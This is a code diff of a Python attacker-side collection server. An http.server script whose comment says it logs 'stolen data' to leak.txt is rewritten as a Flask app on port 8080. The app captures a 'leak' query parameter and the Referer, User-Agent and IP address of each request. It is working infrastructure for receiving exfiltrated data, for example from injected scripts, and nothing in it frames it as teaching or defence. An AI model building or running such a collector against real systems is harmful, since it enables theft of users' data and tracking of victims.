@@ -1,15 +1,21 @@
-from http.server import SimpleHTTPRequestHandler, HTTPServer
+from flask import Flask, request
 
-class MyHandler(SimpleHTTPRequestHandler):
-    def do_GET(self):
-        print("Data leaked:", self.path)  # Logs the stolen data
-        with open("leak.txt", "a") as f:
-            f.write(self.path + "\n")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'Captured')
+app = Flask(__name__)
 
-server_address = ('', 8080)
-httpd = HTTPServer(server_address, MyHandler)
-print("Listening on port 8080...")
-httpd.serve_forever()
+@app.route('/', methods=['GET'])
+def capture_data():
+    leak = request.args.get('leak', 'No leak provided')
+    referer = request.headers.get('Referer', 'No referer')
+    user_agent = request.headers.get('User-Agent', 'No user agent')
+    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    print(f"\n[+] Incoming Request:")
+    print(f"    - Leak: {leak}")
+    print(f"    - Referer: {referer}")
+    print(f"    - User-Agent: {user_agent}")
+    print(f"    - IP Address: {ip_address}")
+
+    return "Logged", 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=True)
